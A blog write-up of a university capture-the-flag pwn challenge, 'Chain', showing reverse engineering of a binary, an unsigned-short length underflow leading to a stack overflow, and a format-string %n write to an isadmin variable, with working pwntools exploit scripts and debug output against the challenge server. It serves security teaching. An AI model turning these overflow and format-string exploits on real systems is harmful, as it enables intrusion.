---
title: "Tutor CTF: Chain"
description: (500 points) Pwn Challenge
author: Kevin Zhu
public: true
uploadDate: 2022-04-11 17:49+11:00
lastModified: 2022-04-11 17:49+11:00
notes: ''
prevPage: 40_tutorctf_bus_buddies
nextPage: 42_tutorctf_alice_and_bob
tags:
- capture the flag
- tutor ctf
- comp6841
menu:
  groups: []
  submenus: []
name: 41_tutorctf_chain
---

## Exploration

We're given just the netcat server IP and port, as well as a single executable `chain`. No source code this time! Let's start by running the script and checking the output:

```term
$ ./chain
How long is your name?
5
Enter your name:
Kevin
Welcome "Kevin
"!
Let's see if you are admin...
Have you tried being a better hacker?
```

So it appears that we can enter in a name length, as well as your actual name. Your name is then printed out, and it appears that we fail some sort of check because we get faced with the message `"Have you tried being a better hacker?"`. A typical thing to try now is a buffer overflow. Let's try entering a super long name:

```term
$ ./chain
How long is your name?
123456
Sorry, get a shorter name
```

Looks like they have a check for the name length. Doing a bit of binary searching, I found the highest length I could enter was 63. Now let's try do a buffer overflow:

```term
$ ./chain
How long is your name?
63
Enter your name:
ABCOEOWUGEHOWEUGHOWURHGOWUGHOWURGHOWROGUHWRGOUWHROGUHRWOGUHWROGUHWOGUHOWRUGHOWRUGHOWRUGHOWUGHOWURHGOUWHGOWURHGOUWHGOWUHRGOWURHGOWURHGOWURGHOWURGHOWRUGHWORGUHWORGUHWOGHUWORGHUOWRGUHWORGUHOWRUGHOWRUHGOWURGH
Welcome "ABCOEOWUGEHOWEUGHOWURHGOWUGHOWURGHOWROGUHWRGOUWHROGUHRWOGUHWRO"!
Let's see if you are admin...
Have you tried being a better hacker?
```

Looks like they cut off our name after 62 characters, which is the limit that we set minus 1. Finally, let's try a format strings attack:

```term
$ ./chain
How long is your name?
63
Enter your name:
%x.%x.%x
Welcome "%x.%x.%x
"!
Let's see if you are admin...
Have you tried being a better hacker?
```

Looks like it didn't work. It doesn't look like we'll get much more information from this, so let's go ahead and try reverse engineering it.

## Reverse Engineering

Booting up `chain` in Ghidra and doing some variable renaming, we get the following:

![](/blog_posts/41_tutorctf_chain/images/image1.png){width=70%}

So it appears that after entering our name length (stored in `name_len[0]`), they subtract one and use that as an argument for `read()`. However, this is really important, since `name_len[0]` is defined as a unsigned short. That means that if we enter a length of 0, not only does it pass the max length check, it means that after we subtract one from it, our name_length will underflow. That means that we'll able to scan up to 0XFFFF = 65535 characters! Let's try this

```term
$ ./chain
How long is your name?
0
Enter your name:
WROGUHWORGUHWOUGHOWURGHOUWRGHOWRHGOURHWOGHOWGOWRUGHORWHGGORHOWGHUOHGWOGURWHGOUWGOHOWGHURUROWHUGRWUGRWHOGHUROWGHUORWHGOUHWOUHGOUWWHRGOUWGOHWROGHOUGHOWHGUORHWOGHURWOHGOWHGUOHWOGOWUGWOGUOWHGROWUGHWORUGOHWOGOWRUGHOWHGORWUGHOWUGOHWROGORWHGUOHRWUOGHWRGHWORG
Welcome "WROGUHWORGUHWOUGHOWURGHOUWRGHOWRHGOURHWOGHOWGOWRUGHORWHGGORHOWGHUOHGWOGURWHGOUWGOHOWGHURUROWHUGRWUGRWHOGHUROWGHUORWHGOUHWOUHGOUWWHRGOUWGOHWROGHOUGHOWHGUORHWOGHURWOHGOWHGUOHWOGOWUGWOGUOWHGROWUGHWORUGOHWOGOWRUGHOWHGORWUGHOWUGOHWROGORWHGUOHRWUOGHWRGHWORG
�"!
UOHGWOGURWHGOUWGOHOWGHURUROWHUGRWUGRWHOGHUROWGHUORWHGOUHWOUHGOUWWHRGOUWGOHWROGHOUGHOWHGUORHWOGHURWOHGOWHGUOHWOGOWUGWOGUOWHGROWUGHWORUGOHWOGOWRUGHOWHGORWUGHOWUGOHWROGORWHGUOHRWUOGHWRGHWORG
�Have you tried being a better hacker?
```

As we can see, we got far more than 63 characters in the Welcome message. But there's more... Where did the `"Let's see if you are admin..."` message go? It seems to have been replaced with more of the nonsense text from the name we entered. Looking at the Ghidra code, we see that the check admin message was originally stored on the stack. This means that we've now achieved buffer overflow, and have started overwriting the admin message.

But this is critical. We see that on line 56, `printf()` is called directly on the string. That means that admin message string is susceptible to a format string vulnerability attack. Let's start by overwriting the admin message to start with 4B's, and then trying to find where on the stack those B's lie. After a bit of experimentation with pwntools, this is what I came up with

```python
from pwn import *

conn = remote("13.210.180.94",  12345)
conn.recvuntil(b'How long is your name?')
conn.sendline(b'0')
conn.recvuntil(b'Enter your name:')

buf = b'A'*63 + b'\x00'
buf += f'ABBBB.%24$x'.encode()
conn.sendline(buf)
conn.recvall()
```

Note that I had an extra 'A' at the beginning of the "BBBB" in order to get the bytes to align properly. Sometimes a littl experimentation like this is required. Running this, I got:

```term
$ p3 get.py DEBUG
[+] Opening connection to 13.210.180.94 on port 12345: Done
[DEBUG] Received 0x16 bytes:
    b'How long is your name?'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x11 bytes:
    b'Enter your name:\n'
[DEBUG] Sent 0x4c bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 00  │AAAA│AAAA│AAAA│AAA·│
    00000040  41 42 42 42  42 2e 25 32  34 24 78 0a               │ABBB│B.%2│4$x·│
    0000004c
[+] Receiving all data: Done (147B)
[DEBUG] Received 0x4b bytes:
    b'Welcome "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"!\n'
[DEBUG] Received 0x47 bytes:
    b'ABBBB.42424242\n'
    b' you are admin...\n'
    b'Have you tried being a better hacker?\n'
[*] Closed connection to 13.210.180.94 port 12345
```

Notice that at the end, I receive `0x47` bytes, which start with `b'ABBBB.42424242\n'`. The 42's are the hexadecimal representation of 'B', which means that we've managed to find the location of the B's on the stack. From here, all we need to do is replace the B's with the address of `isadmin`, and replace the `%x` with a `%n`. The `%n` will have the effect of writing the number of bytes we've written so far in the printf to the address specified. Note that the exact number of bytes that `%n` will use to write to `isadmin` doesn't matter, as long as it's non zero.

To get the address of `isadmin`, we can use objdump:

```term
$ objdump -t ./chain | grep isadmin
0804a044 g     O .bss	00000004              isadmin
```

I.e. the address is `0x0804a044`. Modifying out python script to the following and running it gets us the flag.

```python
from pwn import *

conn = remote("13.210.180.94",  12345)
conn.recvuntil(b'How long is your name?')
conn.sendline(b'0')
conn.recvuntil(b'Enter your name:')

buf = b'A'*63 + b'\x00'
# buf += f'ABBBB%24$x\n\x00'.encode()
buf += b'A\x44\xa0\x04\x08%24$n'
conn.sendline(buf)
ret = conn.recvall()
print(ret)
```

```term
$ p3 get.py DEBUG
[+] Opening connection to 13.210.180.94 on port 12345: Done
[DEBUG] Received 0x16 bytes:
    b'How long is your name?'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x11 bytes:
    b'Enter your name:\n'
[DEBUG] Sent 0x4b bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 00  │AAAA│AAAA│AAAA│AAA·│
    00000040  41 44 a0 04  08 25 32 34  24 6e 0a                  │AD··│·%24│$n·│
    0000004b
[+] Receiving all data: Done (357B)
[DEBUG] Received 0x4b bytes:
    b'Welcome "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"!\n'
[DEBUG] Received 0x119 bytes:
    00000000  41 44 a0 04  08 0a 66 20  79 6f 75 20  61 72 65 20  │AD··│··f │you │are │
    00000010  61 64 6d 69  6e 2e 2e 2e  0a 43 4f 4d  50 36 38 34  │admi│n...│·COM│P684│
    00000020  31 ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  │1{RE│DACT│EDRE│DACT│
    00000030  ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  │EDRE│DACT│EDRE│DACT│
    00000040  ?? ?? ?? ??  ?? ?? 7d 0a  00 00 00 00  00 00 00 00  │EDRE│DA}·│····│····│
    00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000110  00 00 00 00  00 00 00 00  00                        │····│····│·│
    00000119
[*] Closed connection to 13.210.180.94 port 12345
b'\nWelcome "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"!\nAD\xa0\x04\x08\nf you are admin...\nCOMP6841{REDACTED}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```
> _Note: Bytes replaced with '?', to avoid spoilers._